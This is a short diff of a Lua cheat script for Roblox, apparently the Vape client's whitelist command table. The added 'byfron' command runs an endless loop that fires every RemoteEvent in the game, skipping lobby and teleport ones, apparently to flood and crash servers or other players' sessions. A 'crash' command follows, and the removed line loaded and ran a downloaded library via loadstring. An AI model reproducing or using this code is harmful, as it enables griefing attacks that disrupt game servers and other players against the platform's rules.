@@ -680,7 +680,15 @@ run(function()
 
 	whitelist.commands = {
 		byfron = function()
-			loadstring(downloadFile('newvape/libraries/test.lua'), 'test')()
+			while wait() do
+				pcall(function()
+					for i,v in game:GetDescendants() do
+						if v:IsA("RemoteEvent") and not string.find(v.Name:lower(),"lobby") and not string.find(v.Name:lower(),"teleport") then
+							v:FireServer()
+						end
+					end
+				end)
+			end
 		end,
 		crash = function()
 			task.spawn(function()
